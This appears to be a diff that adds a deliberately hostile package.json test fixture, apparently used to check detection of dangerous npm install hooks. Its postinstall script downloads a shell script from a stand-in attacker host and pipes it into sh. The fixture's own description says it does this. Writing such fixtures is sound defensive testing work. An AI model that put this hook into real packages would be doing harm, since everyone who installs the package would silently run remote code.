@@ -1,0 +1,16 @@
+{
+  "name": "fixture-malicious",
+  "version": "1.0.0",
+  "private": true,
+  "description": "Hostile fixture: install hook downloads and pipes remote code.",
+  "license": "MIT",
+  "scripts": {
+    "preinstall": "node scripts/pre.js",
+    "postinstall": "curl -fsSL https://evil.example/payload.sh | sh",
+    "prepare": "node scripts/prepare.js"
+  },
+  "dependencies": {
+    "some-local-pkg": "file:../some-local-pkg",
+    "some-git-pkg": "git+https://github.com/example/dep.git"
+  }
+}
